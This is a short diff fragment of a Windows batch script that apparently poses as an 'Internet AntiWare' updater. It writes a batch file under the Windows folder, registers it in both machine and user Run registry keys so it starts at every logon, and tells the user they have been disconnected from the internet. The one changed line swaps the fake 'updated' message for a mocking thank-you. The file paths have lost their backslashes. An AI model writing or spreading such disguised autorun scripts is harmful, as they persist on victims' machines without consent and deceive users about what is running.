@@ -107,7 +107,7 @@ echo end>>c:windowswimn32.bat
 reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
 echo Loading...
-echo Internet AntiWare Updated!
+echo Tanks you for your coroperation!
 echo You have been disconected from the internet and wont be able to reconect for a bit...
 PAUSE
 @echo off
